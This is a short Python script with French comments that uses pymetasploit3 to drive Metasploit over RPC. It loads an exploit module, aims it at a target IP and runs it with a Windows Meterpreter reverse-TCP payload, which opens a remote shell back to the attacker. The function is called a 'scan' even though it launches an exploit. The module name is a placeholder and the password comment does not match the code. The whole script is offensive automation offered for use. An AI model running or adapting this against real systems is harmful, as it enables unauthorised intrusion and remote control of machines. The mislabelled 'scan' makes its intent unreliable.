from pymetasploit3.msfrpc import MsfRpcClient

def run_metasploit_scan(target):
    # Remplacez 'my_password' par le mot de passe de votre choix pour la connexion RPC à Metasploit
    client = MsfRpcClient('password', server='localhost', port=55553, ssl=False)

    # Utilisez l'exploit 'example_exploit' comme exemple, remplacez-le par un exploit réel
    exploit = client.modules.use('exploit', 'example_exploit')
    exploit['RHOSTS'] = target

    # Configurez le payload (exemple: windows/meterpreter/reverse_tcp)
    payload = 'windows/meterpreter/reverse_tcp'
    exploit.execute(payload=payload)

    # Fermez la connexion RPC
    client.logout()

# Exemple d'utilisation de la fonction
if __name__ == '__main__':
    target = '192.168.1.2'  # Remplacez par l'adresse IP cible réelle
    run_metasploit_scan(target)
